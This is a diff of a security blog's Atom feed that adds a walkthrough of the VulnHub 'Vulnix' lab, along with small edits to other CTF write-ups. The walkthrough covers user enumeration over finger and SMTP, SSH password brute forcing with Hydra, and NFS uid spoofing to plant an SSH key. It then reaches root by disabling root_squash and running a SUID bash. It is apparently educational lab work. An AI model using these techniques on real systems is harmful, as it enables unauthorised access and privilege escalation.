@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-06-19T12:53:58-04:00</updated>
+  <updated>2017-06-21T11:01:26-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,453 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[HackLAB Vulnix]]></title>
+    <link href="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/"/>
+    <updated>2017-06-20T08:04:29-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix</id>
+    <content type="html"><![CDATA[<p>Vulnix is an older machine from VulnHub that intends to present vulnerabilities from a misconfiguration point of view. The goal is to get the flag inside /root</p>
+
+<!-- more -->
+
+
+<p>Here are the Nmap results:</p>
+
+<p><code>
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+25/tcp    open  smtp       Postfix smtpd
+79/tcp    open  finger     Linux fingerd
+110/tcp   open  pop3?
+111/tcp   open  rpcbind    2-4 (RPC #100000)
+143/tcp   open  imap       Dovecot imapd
+512/tcp   open  exec       netkit-rsh rexecd
+513/tcp   open  login
+514/tcp   open  tcpwrapped
+993/tcp   open  ssl/imap   Dovecot imapd
+995/tcp   open  ssl/pop3s?
+2049/tcp  open  nfs_acl    2-3 (RPC #100227)
+36190/tcp open  status     1 (RPC #100024)
+40731/tcp open  mountd     1-3 (RPC #100005)
+43539/tcp open  nlockmgr   1-4 (RPC #100021)
+46423/tcp open  mountd     1-3 (RPC #100005)
+52024/tcp open  mountd     1-3 (RPC #100005)
+</code></p>
+
+<h3>finger user enumeration</h3>
+
+<p>There are quite a few services listening on the host. One of the first things that grabbed my attention was finger running on port 79. Because of this, we can use finger to perform <a href="https://pentestlab.blog/tag/finger/">user enumeration</a> on the host. We can use Nmap&rsquo;s script scan to see who is logged on the host, or do it manually. Here I will show the manual way:</p>
+
+<p><code>
+finger @192.168.217.142
+No one logged on.
+</code></p>
+
+<p>The same thing can be achieved by running Nmap with the <em>-sC</em> flag. Next I tried to get more information about the root user:</p>
+
+<p><code>
+finger root@192.168.217.142
+Login: root                     Name: root
+Directory: /root                        Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+</code></p>
+
+<p>It seems the root user never logged in, but we still obtained the directory and shell that root uses. I tried a few more guesses and discovered a couple more users on the host:</p>
+
+<p>```
+finger <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x75;&#115;&#101;&#114;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#50;&#x31;&#55;&#x2e;&#x31;&#x34;&#x32;">&#x75;&#x73;&#x65;&#114;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#49;&#x37;&#x2e;&#49;&#52;&#x32;</a>
+Login: user                     Name: user
+Directory: /home/user                   Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.</p>
+
+<p>Login: dovenull                 Name: Dovecot login user
+Directory: /nonexistent                 Shell: /bin/false
+Never logged in.
+No mail.
+No Plan.</p>
+
+<p>finger <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#x76;&#x75;&#x6c;&#x6e;&#x69;&#120;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#50;&#x31;&#55;&#46;&#49;&#52;&#50;">&#118;&#x75;&#x6c;&#x6e;&#x69;&#x78;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#50;&#x31;&#55;&#46;&#x31;&#52;&#x32;</a>
+Login: vulnix                   Name:
+Directory: /home/vulnix                 Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+```</p>
+
+<h3>SMTP user enumeration</h3>
+
+<p>Since port 25 is open, we can also attempt some enumeration with SMTP. Again, this can be accomplished with an Nmap script, but this time I want to use an utility called <strong>smtp-user-enum</strong>.</p>
+
+<p>Homepage: <a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></p>
+
+<blockquote><p>smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail).
+Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to
+work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.</p></blockquote>
+
+<p>Let&rsquo;s see its options:</p>
+
+<p>```
+smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>
+
+<p>Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )</p>
+
+<p>options are:</p>
+
+<pre><code>    -m n     Maximum number of processes (default: 5)
+-M mode  Method to use for username guessing EXPN, VRFY or RCPT (default: VRFY)
+-u user  Check if user exists on remote system
+-f addr  MAIL FROM email address.  Used only in "RCPT TO" mode (default: user@example.com)
+    -D dom   Domain to append to supplied user list to make email addresses (Default: none)
+             Use this option when you want to guess valid email addresses instead of just usernames
+             e.g. "-D example.com" would guess foo@example.com, bar@example.com, etc.  Instead of 
+                  simply the usernames foo and bar.
+-U file  File of usernames to check via smtp service
+-t host  Server host running smtp service
+-T file  File of hostnames running the smtp service
+-p port  TCP port on which smtp service runs (default: 25)
+-d       Debugging output
+-t n     Wait a maximum of n seconds for reply (default: 5)
+-v       Verbose
+-h       This help message
+</code></pre>
+
+<p>Also see smtp-user-enum-user-docs.pdf from the smtp-user-enum tar ball.</p>
+
+<p>Examples:</p>
+
+<p>$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
+$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
+$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
+$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1
+```</p>
+
+<p>I created a file named users.txt with some usernames to try, and fed it to the script:</p>
+
+<p>```
+root@kali:~# smtp-user-enum -U users.txt -t 192.168.217.142
+Starting smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>
+
+<hr />
+
+
+
+<hr />
+
+<p>Mode &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip; VRFY
+Worker Processes &hellip;&hellip;&hellip; 5
+Usernames file &hellip;&hellip;&hellip;.. users.txt
+Target count &hellip;&hellip;&hellip;&hellip;. 1
+Username count &hellip;&hellip;&hellip;.. 6
+Target TCP port &hellip;&hellip;&hellip;. 25
+Query timeout &hellip;&hellip;&hellip;&hellip; 5 secs
+Target domain &hellip;&hellip;&hellip;&hellip;</p>
+
+<h6>## Scan started at Tue Jun 20 09:29:30 2017</h6>
+
+<p>192.168.217.142: root exists
+192.168.217.142: vulnix exists
+192.168.217.142: user exists
+192.168.217.142: postmaster exists
+192.168.217.142: mail exists</p>
+
+<h6>## Scan completed at Tue Jun 20 09:29:30 2017</h6>
+
+<p>5 results.</p>
+
+<p>6 queries in 1 seconds (6.0 queries / sec)
+```</p>
+
+<p>You can see that this is a pretty cool script that can help you enumerate users pretty fast, and now we know more valid user accounts on the system. You can also use it to find valid email addresses instead of accounts, by using the <em>-D</em> option. I tried a few examples, but got no hits.</p>
+
+<p>Moving on, ports 512-514 are fore the old r-utilities, and if misconfigured, could allow remote access to the host. But in this case, the system asked me for root&rsquo;s SSH password, so I couldn&rsquo;t exploit them.</p>
+
+<h3>Exploit NFS</h3>
+
+<p>We&rsquo;ve done some preliminary enumeration on the target, now it&rsquo;s time to return to the results of the Nmap scan. We&rsquo;ve identified the fact that NFS is running on the Vulnix host. I confirmed it with the use of <em>rpcinfo</em>:</p>
+
+<p>```
+rpcinfo -p 192.168.217.142
+   program vers proto   port  service</p>
+
+<pre><code>100000    4   tcp    111  portmapper
+100000    3   tcp    111  portmapper
+100000    2   tcp    111  portmapper
+100000    4   udp    111  portmapper
+100000    3   udp    111  portmapper
+100000    2   udp    111  portmapper
+100024    1   udp  39427  status
+100024    1   tcp  42309  status
+100003    2   tcp   2049  nfs
+100003    3   tcp   2049  nfs
+100003    4   tcp   2049  nfs
+100227    2   tcp   2049
+100227    3   tcp   2049
+100003    2   udp   2049  nfs
+100003    3   udp   2049  nfs
+100003    4   udp   2049  nfs
+100227    2   udp   2049
+100227    3   udp   2049
+100021    1   udp  39258  nlockmgr
+100021    3   udp  39258  nlockmgr
+100021    4   udp  39258  nlockmgr
+100021    1   tcp  34418  nlockmgr
+100021    3   tcp  34418  nlockmgr
+100021    4   tcp  34418  nlockmgr
+100005    1   udp  34638  mountd
+100005    1   tcp  52581  mountd
+100005    2   udp  42603  mountd
+100005    2   tcp  53226  mountd
+100005    3   udp  49704  mountd
+100005    3   tcp  47770  mountd
+</code></pre>
+
+<p>```</p>
+
+<p>If NFS wasn&rsquo;t properly configured, we might have access to shares we wouldn&rsquo;t otherwise be allowed to. There are a couple of ways to list the shares, and I&rsquo;m going to show here some of them. Th easiest way is from the command line, with the <code>showmount -e</code> command:</p>
+
+<p><code>
+root@kali:~# showmount -e 192.168.217.142
+Export list for 192.168.217.142:
+/home/vulnix *
+</code></p>
+
+<p>Good news! The vulnix home directory is being shared with no restrictions. Before going there, let&rsquo;s see how we can get the same information with Nmap:</p>
+
+<p>```
+nmap -sV -p111 &mdash;script=nfs-showmount 192.168.217.142</p>
+
+<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-06-21 06:00 EDT
+Nmap scan report for 192.168.217.142
+Host is up (0.00027s latency).
+PORT    STATE SERVICE VERSION
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| nfs-showmount:
+|<em>  /home/vulnix *
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      47770/tcp  mountd
+|   100005  1,2,3      49704/udp  mountd
+|   100021  1,3,4      34418/tcp  nlockmgr
+|   100021  1,3,4      39258/udp  nlockmgr
+|   100024  1          39427/udp  status
+|   100024  1          42309/tcp  status
+|   100227  2,3         2049/tcp  nfs_acl
+|</em>  100227  2,3         2049/udp  nfs_acl
+```</p>
+
+<p>We can also use the <em>auxiliary/scanner/nfs/nfsmount</em> Metasploit module:</p>
+
+<p>```
+msf auxiliary(nfsmount) > run</p>
+
+<p>[+] 192.168.217.142:111   &ndash; 192.168.217.142 NFS Export: /home/vulnix [<em>]
+[</em>] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```</p>
+
+<p>I mounted the share locally to see what&rsquo;s there. The <em>nolock</em> option disables file locking and it&rsquo;s sometimes required for older NFS servers.</p>
+
+<p><code>
+root@kali:/mnt# mkdir nfs
+root@kali:/mnt# mount -t nfs -o nolock 192.168.217.142:/home/vulnix /mnt/nfs
+</code></p>
+
+<p>However, when I tried to access the newly mounted share, I got permission denied errors. I couldn&rsquo;t <em>chmod</em> or do anything else. After some reading on the interwebz, it seems the likely cause is the <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html">root_squash</a> option, that nullifies the root privileges of the clients accessing the share, and instead gives them the user ID of the nobody user. It seems to be enabled by default on modern NFS implementations, and you can read more about it <a href="http://www.techrepublic.com/article/working-with-nfs/">here</a>.</p>
+
+<p>After some more digging through the interwebz, I found an <a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">interesting article about nfsshell</a>, which is a userspace NFS client shell. I downloaded it from its <a href="https://github.com/NetDirect/nfsshell">Github page</a>, and to compile I had to install the following <a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">dependencies</a>: <code>apt-get install libreadline-dev libncurses5-dev</code>. Afterwards, I ran <em>make</em> and it compiled fine. Here are its options:</p>
+
+<p><code>
+nfs&gt; help
+host &lt;host&gt; - set remote host name
+uid [&lt;uid&gt; [&lt;secret-key&gt;]] - set remote user id
+gid [&lt;gid&gt;] - set remote group id
+cd [&lt;path&gt;] - change remote working directory
+lcd [&lt;path&gt;] - change local working directory
+cat &lt;filespec&gt; - display remote file
+ls [-l] &lt;filespec&gt; - list remote directory
+get &lt;filespec&gt; - get remote files
+df - file system information
+rm &lt;file&gt; - delete remote file
+ln &lt;file1&gt; &lt;file2&gt; - link file
+mv &lt;file1&gt; &lt;file2&gt; - move file
+mkdir &lt;dir&gt; - make remote directory
+rmdir &lt;dir&gt; - remove remote directory
+chmod &lt;mode&gt; &lt;file&gt; - change mode
+chown &lt;uid&gt;[.&lt;gid&gt;] &lt;file&gt; -  change owner
+put &lt;local-file&gt; [&lt;remote-file&gt;] - put file
+mount [-upTU] [-P port] &lt;path&gt; - mount file system
+umount - umount remote file system
+umountall - umount all remote file systems
+export - show all exported file systems
+dump - show all remote mounted file systems
+status - general status report
+help - this help message
+quit - its all in the name
+bye - good bye
+handle [&lt;handle&gt;] - get/set directory file handle
+mknod &lt;name&gt; [b/c major minor] [p] - make device
+</code></p>
+
+<p>From my reading about NFS and root squashing, it seems that knowing the uid of the share&rsquo;s owner would allow mounting the share as that user and bypassing the access denied errors that I got as root. Because the share is the home folder of the vulnix user, we need to know the uid for that particular user account. But we need local access to the machine to find that out. Well, we did get some usernames from the enumeration stage, so we probably have to attempt a bruteforce attack. From all the discovered usernames, I only kept the user and vulnix ones, because the rest were users for various services on the system. And then I ran Hydra with the recommended task number for SSH:</p>
+
+<p><img class="center" src="/images/pentest/vulnix-hydra.png" title="&lsquo;hydra&rsquo; &lsquo;letmein&rsquo;" ></p>
+
+<p>Hydra found the password for user pretty quickly. I logged in as user, but didn&rsquo;t find anything out of the ordinary. However, I was able to get the uid for the vulnix account:</p>
+
+<p><code>
+user@vulnix:~$ id vulnix
+uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
+</code></p>
+
+<p>I went back to nfsshell and made the changes:</p>
+
+<p><code>
+nfs&gt; host 192.168.217.142
+Using a privileged port (1023)
+Open 192.168.217.142 (192.168.217.142) TCP
+nfs&gt; uid 2008
+nfs&gt; gid 2008
+nfs&gt; status
+User id      : 2008
+Group id     : 2008
+Remote host  : `192.168.217.142'
+Transfer size: 0
+</code></p>
+
+<p>Now I was able to access the share:</p>
+
+<p><code>
+nfs&gt; ls -l
+drwxr-x---  2     2008  2008      4096  Sep  2  2012  .
+drwxr-x---  2     2008  2008      4096  Sep  2  2012  ..
+drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bash_logout
+drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bashrc
+drwxr-x---  2     2008  2008      4096  Sep  2  2012  .profile
+</code></p>
+
+<p>Since this is vulnix&rsquo;s home directory, we can put an SSH key in here to allow remote access. I tried the next steps through nfsshell, but I was limited in the commands I could run. So I created a local vulnix user on my machine, and assigned it the uid 2008: <code>root@kali:~# useradd vulnix -u 2008</code>. Then I generated an SSH key pair from this account:</p>
+
+<p><code>
+root@kali:~# su vulnix
+$ id
+uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
+$ cd /tmp
+$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in vulnix.
+Your public key has been saved in vulnix.pub.
+The key fingerprint is:
+SHA256:P6FAPt9R/0TbOTtQUhk8SiBUlgAtINciO0mUmr2Nrp4 vulnix@kali
+The key's randomart image is:
++---[RSA 2048]----+
+|  .o.oo.++o+o .oo|
+|   +o. o .o. ..+ |
+|  = + o .   o...o|
+| o = o     . oo.+|
+|    = + S o  ..+o|
+|   o . + + o  .oo|
+|  .     o +    o.|
+|  ..       .    .|
+|.E.              |
++----[SHA256]-----+
+</code></p>
+
+<p>I now navigated without problems to the NFS share, created a .ssh directory and copied the contents of the public key to <em>authorized_keys</em>:</p>
+
+<p><code>
+$ cat /tmp/vulnix.pub &gt; .ssh/authorized_keys
+$ cat .ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali
+</code></p>
+
+<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#118;&#117;&#108;&#x6e;&#x69;&#x78;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x32;&#x31;&#55;&#46;&#49;&#52;&#50;">&#118;&#x75;&#x6c;&#110;&#x69;&#x78;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x32;&#x31;&#55;&#46;&#x31;&#52;&#x32;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>
+
+<p>```
+vulnix@vulnix:~$ sudo -l
+Matching &lsquo;Defaults&rsquo; entries for vulnix on this host:</p>
+
+<pre><code>env_reset,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</code></pre>
+
+<p>User vulnix may run the following commands on this host:</p>
+
+<pre><code>(root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+</code></pre>
+
+<p>```</p>
+
+<p>This is wonderful news. First of all, we need to disable <em>root_squash</em>. Then we can mount the root directory and read the flag, or we can leave a shell binary in vulnix&rsquo;s home directory, and run it later with root privileges. Let&rsquo;s do just that! I disabled root squashing with <code>/home/vulnix    *(rw,no_root_squash)</code>. Then I copied the bash executable:</p>
+
+<p><code>
+vulnix@vulnix:~$ cp /bin/bash /home/vulnix/
+vulnix@vulnix:~$ ls -l
+total 900
+-rwxr-xr-x 1 vulnix vulnix 920788 Jun 21 14:46 bash
+</code></p>
+
+<p>For the NFS configuration changes to take effect, I needed to make the NFS service to reload its configuration file or restart it, but I didn&rsquo;t have permissions to do that. So I rebooted the machine (but unmounted the share first). After rebooting, I mounted the share again, navigated to it as root with no problems, and changed permissions on the bash shell to make it SUID: <code>chmod 4777 bash</code> (I also copied it again as root).</p>
+
+<p>From the SSH, I verified it as the vulnix user:</p>
+
+<p><code>
+vulnix@vulnix:~$ ls -l bash
+-rwsrwxrwx 1 root root 920788 Jun 21 15:34 bash
+</code></p>
+
+<p>Finally, I ran the shell while preserving its permissions:</p>
+
+<p><code>
+vulnix@vulnix:~$ ./bash -p
+bash-4.2# whoami
+root
+bash-4.2# cat /root/trophy.txt
+cc614640424f5bd60ce5d5264899c3be
+</code></p>
+
+<p>Not done yet, I cracked the MD5 hash to reveal the name of the l33t name of the author: Reb00tu53r. This was a fun one!</p>
+
+<p><strong>Learn more</strong></p>
+
+<ul>
+<li><p><a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">NFSShell on Kali Linux</a></p></li>
+<li><p><a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">Using nfsshell to compromise older environments</a></p></li>
+<li><p><a href="http://www.techrepublic.com/article/working-with-nfs/">Working with NFS</a></p></li>
+</ul>
+
+
+<p>```</p>
+
+<hr />
+
+<p>/ Q: What do you call a half-dozen    \
+| Indians with Asian flu? A: Six sick |
+\ Sikhs (sic).                        /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Bow before the Lord of the Root]]></title>
@@ -102,7 +549,7 @@ Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari</p>
 <p>We know there is a smeagol user on the box, but couldn&rsquo;t find any other exploit that might help in this situation. So I just tried SSH'ing into the box to see what happens:</p>
 
 <p>```
-ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#115;&#x6d;&#x65;&#x61;&#x67;&#111;&#108;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x32;&#x31;&#x37;&#x2e;&#49;&#x33;&#54;">&#115;&#109;&#101;&#97;&#x67;&#111;&#108;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#49;&#x37;&#46;&#49;&#51;&#54;</a>
+ssh <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#115;&#x6d;&#101;&#x61;&#103;&#111;&#108;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#x32;&#x31;&#x37;&#x2e;&#x31;&#51;&#x36;">&#x73;&#x6d;&#x65;&#97;&#x67;&#x6f;&#x6c;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x32;&#49;&#x37;&#x2e;&#x31;&#x33;&#x36;</a>
 The authenticity of host &lsquo;192.168.217.136 (192.168.217.136)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -126,7 +573,7 @@ Warning: Permanently added &lsquo;192.168.217.136&rsquo; (ECDSA) to the list of 
 </code></pre>
 
 <p>Easy as 1,2,3
-<a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#x73;&#109;&#x65;&#97;&#103;&#111;&#108;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x32;&#49;&#x37;&#46;&#x31;&#x33;&#54;">&#x73;&#109;&#101;&#97;&#x67;&#x6f;&#108;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#46;&#x32;&#49;&#55;&#x2e;&#x31;&#51;&#x36;</a>&rsquo;s password:
+<a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#115;&#x6d;&#101;&#x61;&#x67;&#x6f;&#108;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#50;&#49;&#x37;&#x2e;&#x31;&#x33;&#x36;">&#115;&#109;&#x65;&#97;&#x67;&#x6f;&#108;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x32;&#x31;&#55;&#x2e;&#x31;&#x33;&#x36;</a>&rsquo;s password:
 ```</p>
 
 <p>Woot, a banner with a hint! The knock part might reference port knocking, as I&rsquo;ve seen that in some previous challenges. And the ports seem to be mentioned already! I used Nmap to knock on ports 1,2 and 3:</p>
@@ -644,7 +1091,7 @@ Connecting to shell-storm.org&hellip;</p>
  Copyright &copy; 2013 Geyslan G. Bem, Hacking bits</p>
 
 <p>   <a href="http://hackingbits.com">http://hackingbits.com</a>
-   <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#103;&#x65;&#121;&#115;&#108;&#97;&#x6e;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#109;">&#x67;&#x65;&#121;&#x73;&#108;&#97;&#110;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;</a></p>
+   <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#103;&#101;&#x79;&#x73;&#x6c;&#97;&#110;&#x40;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#109;">&#x67;&#x65;&#x79;&#115;&#108;&#97;&#110;&#64;&#103;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;</a></p>
 
 <p> This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
@@ -2805,8 +3252,8 @@ Database: seth
 <p>I went back to that unconventional SSH port and tried to log in as ramses with the password: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE . When that didn&rsquo;t work, I fed it to Google and the first MD5 decoder that popped decrypted it as <code>omega</code></p>
 
 <p>``` plain
-ssh -p 777 <a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#x72;&#x61;&#109;&#115;&#x65;&#115;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x32;&#x31;&#55;&#46;&#x31;&#x33;&#53;">&#114;&#x61;&#x6d;&#115;&#x65;&#115;&#64;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#50;&#49;&#55;&#46;&#x31;&#51;&#x35;</a>
-<a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#114;&#x61;&#x6d;&#x73;&#101;&#x73;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#56;&#46;&#50;&#x31;&#55;&#46;&#x31;&#51;&#53;">&#x72;&#97;&#x6d;&#x73;&#101;&#x73;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#50;&#x31;&#55;&#x2e;&#49;&#x33;&#53;</a>&rsquo;s password:</p>
+ssh -p 777 <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#114;&#97;&#109;&#x73;&#101;&#115;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#x2e;&#x32;&#49;&#x37;&#46;&#49;&#x33;&#x35;">&#114;&#x61;&#109;&#115;&#x65;&#x73;&#x40;&#49;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#50;&#x31;&#55;&#x2e;&#49;&#x33;&#x35;</a>
+<a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#114;&#97;&#x6d;&#x73;&#101;&#x73;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x32;&#49;&#55;&#x2e;&#49;&#x33;&#x35;">&#x72;&#97;&#x6d;&#x73;&#x65;&#115;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x32;&#49;&#55;&#46;&#49;&#x33;&#53;</a>&rsquo;s password:</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
@@ -2862,8 +3309,8 @@ adf11c7a9e6523e630aaf3b9b7acb51d</p>
 
 <p>It seems that you have pwned the box, congrats.
 Now you done that I wanna talk with you. Write a walk &amp; mail at
-<a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x78;&#x6c;&#x79;&#x30;&#110;&#x40;&#115;&#x69;&#x67;&#x61;&#x69;&#x6e;&#116;&#46;&#111;&#x72;&#x67;">&#x78;&#108;&#121;&#48;&#110;&#x40;&#115;&#x69;&#103;&#97;&#105;&#x6e;&#x74;&#x2e;&#111;&#114;&#103;</a> attach the walk and proof.txt
-If sigaint.org is down you may mail at <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#110;&#x62;&#x73;&#x6c;&#121;&#48;&#110;&#x40;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#x6e;&#98;&#x73;&#108;&#x79;&#x30;&#110;&#x40;&#103;&#109;&#x61;&#x69;&#108;&#46;&#99;&#111;&#109;</a></p>
+<a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#120;&#x6c;&#x79;&#x30;&#x6e;&#x40;&#115;&#x69;&#x67;&#97;&#x69;&#110;&#116;&#x2e;&#x6f;&#x72;&#x67;">&#120;&#108;&#121;&#48;&#110;&#x40;&#115;&#x69;&#103;&#x61;&#x69;&#x6e;&#116;&#x2e;&#111;&#x72;&#103;</a> attach the walk and proof.txt
+If sigaint.org is down you may mail at <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x6e;&#x62;&#x73;&#108;&#121;&#x30;&#x6e;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#x6e;&#x62;&#115;&#108;&#x79;&#x30;&#x6e;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;</a></p>
 
 <p>USE THIS PGP PUBLIC KEY</p>
 
@@ -2981,221 +3428,6 @@ ramses@NullByte:/var/www/backup$ ./procwatch</p>
 / You&rsquo;ll wish that you had done some of \
 | the hard things when they were easier |
 \ to do.                                /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Hackademic RTB2]]></title>
-    <link href="http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2/"/>
-    <updated>2016-07-20T13:36:20-04:00</updated>
